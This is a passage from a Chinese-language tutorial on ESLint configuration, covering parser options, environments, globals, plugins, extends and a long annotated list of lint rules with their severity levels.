string">"parserOptions"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>      <span class="token string">"ecmaVersion"</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span>      <span class="token string">"sourceType"</span><span class="token punctuation">:</span> <span class="token string">"module"</span><span class="token punctuation">,</span>      <span class="token string">"ecmaFeatures"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"jsx"</span><span class="token punctuation">:</span> <span class="token boolean">true</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  不同的语法分析器可能具有不同的选项。</p><h3 id="env"><a href="#env" class="headerlink" title="env"></a>env</h3><p>指定执行环境，一个执行环境会预定义一组全局变量。示例：</p><p>使用注释配置</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">/* eslint-env node, mocha */</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用配置文件</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"env"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"browser"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token string">"node"</span><span class="token punctuation">:</span> <span class="token boolean">true</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="globals"><a href="#globals" class="headerlink" title="globals"></a>globals</h3><p>使用未在当前文件中定义的全局变量时，会命中 <code>no-undef</code> 规则，通过 <code>globals</code> 配置指定的全局变量无视 <code>no-undef</code> 规则。示例：</p><p>在配置文件中指定：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"globals"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"var1"</span><span class="token punctuation">:</span> <span class="token string">"writable"</span><span class="token punctuation">,</span>    <span class="token string">"var2"</span><span class="token punctuation">:</span> <span class="token string">"readonly"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h3><p>插件是第三方定制的规则集合，<code>plugins</code> 参数用于指定第三方插件，插件名中的 <code>eslint-plugin-</code> 前缀可以省略。示例：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>    plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token string">'typescript'</span><span class="token punctuation">,</span>        <span class="token string">'@typescript-eslint'</span><span class="token punctuation">,</span>        <span class="token string">"prettier"</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用插件时必须安装其 npm 包。</p><h3 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h3><p>配置文件可以在已有配置的基础上进行扩展，<code>extends</code> 用于指定基础配置。该参数的值为以下之一：</p><ul><li>一个指定基础配置来源的字符串</li><li>一个指定基础配置来源的字符串的数组：数组中每个配置扩展它前面的配置</li></ul><p>ESLint 支持递归扩展配置，所以基础配置中也可包含 <code>extends</code> 参数。</p><p>当指定基础配置时，<code>rules</code> 参数指定的规则可按如下几种方式进行扩展：</p><ul><li>启用基础配置中没有规则</li><li>继承基础配置中的规则，改变其错误级别，但不改变其附加选项： <ul><li>基础配置: <code>&quot;eqeqeq&quot;: [&quot;error&quot;, &quot;allow-null&quot;]</code></li><li>扩展配置: <code>&quot;eqeqeq&quot;: &quot;warn&quot;</code></li><li>最终有效配置：<code>&quot;eqeqeq&quot;: [&quot;warn&quot;, &quot;allow-null&quot;]</code></li></ul></li><li>覆盖基础配置中的规则: <ul><li>基础配置：<code>&quot;quotes&quot;: [&quot;error&quot;, &quot;single&quot;, &quot;avoid-escape&quot;]</code></li><li>扩展配置：<code>&quot;quotes&quot;: [&quot;error&quot;, &quot;single&quot;]</code></li><li>最终有效配置: <code>&quot;quotes&quot;: [&quot;error&quot;, &quot;single&quot;]</code></li></ul></li></ul><p>使用 <code>extends</code> 指定的基础配置来源可以是：</p><ul><li><p><code>eslint:recommended</code>，启用 <a href="https://link.juejin.im?target=https%3A%2F%2Feslint.org%2Fdocs%2Frules%2F" target="_blank" rel="noopener">ESLint 内置规则集</a> 的一个子集。</p></li><li><p>共享配置包，一类导出 ESLint 配置对象的 npm 包，比如 <a href="https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Feslint-config-standard" target="_blank" rel="noopener"><code>eslint-config-standard</code></a>、<a href="https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Feslint-config-airbnb" target="_blank" rel="noopener"><code>eslint-config-airbnb</code></a> 等。共享配置包需要安装才能使用，配置时可省略报名中的 <code>eslint-config-</code> 前缀。</p><p>示例：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"extends"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"airbnb"</span><span class="token punctuation">]</span>  <span class="token string">"rules"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"no-set-state"</span><span class="token punctuation">:</span> <span class="token string">"off"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>插件导出的命名配置，其配置值由以下几部分组成：</p><ul><li><code>plugin:</code></li><li>插件包名（可省略前缀，例如：<code>react</code>）</li><li><code>/</code></li><li>配置名（例如：<code>recommended</code>）</li></ul><p>示例：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"react"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"extends"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"eslint:recommended"</span><span class="token punctuation">,</span>    <span class="token string">"plugin:react/recommended"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"rules"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"no-set-state"</span><span class="token punctuation">:</span> <span class="token string">"off"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置文件，通过配置文件的绝对路径或相对路径指定。</p><p>示例：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"extends"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"./node_modules/coding-standard/eslintDefaults.js"</span><span class="token punctuation">,</span>    <span class="token string">"./node_modules/coding-standard/.eslintrc-es6"</span><span class="token punctuation">,</span>    <span class="token string">"./node_modules/coding-standard/.eslintrc-jsx"</span><span class="token punctuation">,</span>    <span class="token string">"./my-eslint-config.js"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"rules"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"eqeqeq"</span><span class="token punctuation">:</span> <span class="token string">"warn"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>eslint:all</code>，启动所有 ESLint 内置规则，不推荐。</p></li></ul><h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><p>ESLint 附带有大量的规则。你可以使用注释或配置文件修改你项目中要使用哪些规则。改变一个规则设置，你必须设置规则 ID 等于这些值之一：</p><ul><li>“off”或0 -关闭规则</li><li>“warn” 或1 - 开启规则, 使用警告 程序不会退出</li><li>“error”或2 - 开启规则, 使用错误 程序退出</li></ul><h2 id="rule解释"><a href="#rule解释" class="headerlink" title="rule解释"></a>rule解释</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"no-alert"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用alert confirm prompt</span><span class="token string">"no-array-constructor"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用数组构造器</span><span class="token string">"no-bitwise"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用按位运算符</span><span class="token string">"no-caller"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用arguments.caller或arguments.callee</span><span class="token string">"no-catch-shadow"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止catch子句参数与外部作用域变量同名</span><span class="token string">"no-class-assign"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止给类赋值</span><span class="token string">"no-cond-assign"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止在条件表达式中使用赋值语句</span><span class="token string">"no-console"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用console</span><span class="token string">"no-const-assign"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止修改const声明的变量</span><span class="token string">"no-constant-condition"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止在条件中使用常量表达式 if(true) if(1)</span><span class="token string">"no-continue"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用continue</span><span class="token string">"no-control-regex"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止在正则表达式中使用控制字符</span><span class="token string">"no-debugger"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用debugger</span><span class="token string">"no-delete-var"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能对var声明的变量使用delete操作符</span><span class="token string">"no-div-regex"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能使用看起来像除法的正则表达式/=foo/</span><span class="token string">"no-dupe-keys"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//在创建对象字面量时不允许键重复 {a:1,a:1}</span><span class="token string">"no-dupe-args"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//函数参数不能重复</span><span class="token string">"no-duplicate-case"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//switch中的case标签不能重复</span><span class="token string">"no-else-return"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//如果if语句里面有return,后面不能跟else语句</span><span class="token string">"no-empty"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//块语句中的内容不能为空</span><span class="token string">"no-empty-character-class"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//正则表达式中的[]内容不能为空</span><span class="token string">"no-empty-label"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用空label</span><span class="token string">"no-eq-null"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止对null使用==或!=运算符</span><span class="token string">"no-eval"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用eval</span><span class="token string">"no-ex-assign"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止给catch语句中的异常参数赋值</span><span class="token string">"no-extend-native"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止扩展native对象</span><span class="token string">"no-extra-bind"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止不必要的函数绑定</span><span class="token string">"no-extra-boolean-cast"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止不必要的bool转换</span><span class="token string">"no-extra-parens"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止非必要的括号</span><span class="token string">"no-extra-semi"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止多余的冒号</span><span class="token string">"no-fallthrough"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止switch穿透</span><span class="token string">"no-floating-decimal"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止省略浮点数中的0 .5 3.</span><span class="token string">"no-func-assign"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止重复的函数声明</span><span class="token string">"no-implicit-coercion"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止隐式转换</span><span class="token string">"no-implied-eval"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用隐式eval</span><span class="token string">"no-inline-comments"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止行内备注</span><span class="token string">"no-inner-declarations"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"functions"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止在块语句中使用声明（变量或函数）</span><span class="token string">"no-invalid-regexp"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止无效的正则表达式</span><span class="token string">"no-invalid-this"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止无效的this，只能用在构造器，类，对象字面量</span><span class="token string">"no-irregular-whitespace"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能有不规则的空格</span><span class="token string">"no-iterator"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用__iterator__ 属性</span><span class="token string">"no-label-var"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//label名不能与var声明的变量名相同</span><span class="token string">"no-labels"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止标签声明</span><span class="token string">"no-lone-blocks"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止不必要的嵌套块</span><span class="token string">"no-lonely-if"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止else语句内只有if语句</span><span class="token string">"no-loop-func"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止在循环中使用函数（如果没有引用外部变量不形成闭包就可以）</span><span class="token string">"no-mixed-requires"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//声明时不能混用声明类型</span><span class="token string">"no-mixed-spaces-and-tabs"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止混用tab和空格</span><span class="token string">"linebreak-style"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"windows"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//换行风格</span><span class="token string">"no-multi-spaces"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能用多余的空格</span><span class="token string">"no-multi-str"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//字符串不能用\换行</span><span class="token string">"no-multiple-empty-lines"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"max"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//空行最多不能超过2行</span><span class="token string">"no-native-reassign"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能重写native对象</span><span class="token string">"no-negated-in-lhs"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//in 操作符的左边不能有!</span><span class="token string">"no-nested-ternary"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用嵌套的三目运算</span><span class="token string">"no-new"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止在使用new构造一个实例后不赋值</span><span class="token string">"no-new-func"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用new Function</span><span class="token string">"no-new-object"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用new Object()</span><span class="token string">"no-new-require"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用new require</span><span class="token string">"no-new-wrappers"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用new创建包装实例，new String new Boolean new Number</span><span class="token string">"no-obj-calls"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能调用内置的全局对象，比如Math() JSON()</span><span class="token string">"no-octal"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用八进制数字</span><span class="token string">"no-octal-escape"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用八进制转义序列</span><span class="token string">"no-param-reassign"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止给参数重新赋值</span><span class="token string">"no-path-concat"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//node中不能使用__dirname或__filename做路径拼接</span><span class="token string">"no-plusplus"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用++，--</span><span class="token string">"no-process-env"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用process.env</span><span class="token string">"no-process-exit"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用process.exit()</span><span class="token string">"no-proto"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用__proto__属性</span><span class="token string">"no-redeclare"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止重复声明变量</span><span class="token string">"no-regex-spaces"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止在正则表达式字面量中使用多个空格 /foo bar/</span><span class="token string">"no-restricted-modules"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//如果禁用了指定模块，使用就会报错</span><span class="token string">"no-return-assign"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//return 语句中不能有赋值表达式</span><span class="token string">"no-script-url"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用javascript:void(0)</span><span class="token string">"no-self-compare"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能比较自身</span><span class="token string">"no-sequences"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用逗号运算符</span><span class="token string">"no-shadow"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//外部作用域中的变量不能与它所包含的作用域中的变量或参数同名</span><span class="token string">"no-shadow-restricted-names"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//严格模式中规定的限制标识符不能作为声明时的变量名使用</span><span class="token string">"no-spaced-func"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//函数调用时 函数名与()之间不能有空格</span><span class="token string">"no-sparse-arrays"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止稀疏数组， [1,,2]</span><span class="token string">"no-sync"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//nodejs 禁止同步方法</span><span class="token string">"no-ternary"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止使用三目运算符</span><span class="token string">"no-trailing-spaces"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//一行结束后面不要有空格</span><span class="token string">"no-this-before-super"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//在调用super()之前不能使用this或super</span><span class="token string">"no-throw-literal"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止抛出字面量错误 throw "error";</span><span class="token string">"no-undef"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能有未定义的变量</span><span class="token string">"no-undef-init"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//变量初始化时不能直接给它赋值为undefined</span><span class="token string">"no-undefined"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能使用undefined</span><span class="token string">"no-unexpected-multiline"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//避免多行表达式</span><span class="token string">"no-underscore-dangle"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//标识符不能以_开头或结尾</span><span class="token string">"no-unneeded-ternary"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止不必要的嵌套 var isYes = answer === 1 ? true : false;</span><span class="token string">"no-unreachable"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能有无法执行的代码</span><span class="token string">"no-unused-expressions"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止无用的表达式</span><span class="token string">"no-unused-vars"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"vars"</span><span class="token punctuation">:</span> <span class="token string">"all"</span><span class="token punctuation">,</span> <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token string">"after-used"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能有声明后未被使用的变量或参数</span><span class="token string">"no-use-before-define"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//未定义前不能使用</span><span class="token string">"no-useless-call"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁止不必要的call和apply</span><span class="token string">"no-void"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁用void操作符</span><span class="token string">"no-var"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁用var，用let和const代替</span><span class="token string">"no-warning-comments"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token string">"terms"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"todo"</span><span class="token punctuation">,</span> <span class="token string">"fixme"</span><span class="token punctuation">,</span> <span class="token string">"xxx"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"location"</span><span class="token punctuation">:</span> <span class="token string">"start"</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//不能有警告备注</span><span class="token string">"no-with"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//禁用with</span><span class="token string">"array-bracket-spacing"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"never"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//是否允许非空数组里面有多余的空格</span><span class="token string">"arrow-parens"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//箭头函数用小括号括起来</span><span class="token string">"arrow-spacing"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//=>的前/后括号</span><span class="token string">"accessor-pairs"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//在对象中使用getter/setter</span><span class="token string">"block-scoped-var"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//块语句中使用var</span><span class="token string">"brace-style"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"1tbs"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//大括号风格</span><span class="token string">"callback-return"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//避免多次调用回调什么的</span><span class="token string">"camelcase"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//强制驼峰法命名</span><span class="token string">"comma-dangle"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"never"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//对象字面量项尾不能有逗号</span><span class="token string">"comma-spacing"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//逗号前后的空格</span><span class="token string">"comma-style"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"last"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//逗号风格，换行时在行首还是行尾</span><span class="token string">"complexity"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//循环复杂度</span><span class="token string">"computed-property-spacing"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"never"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" 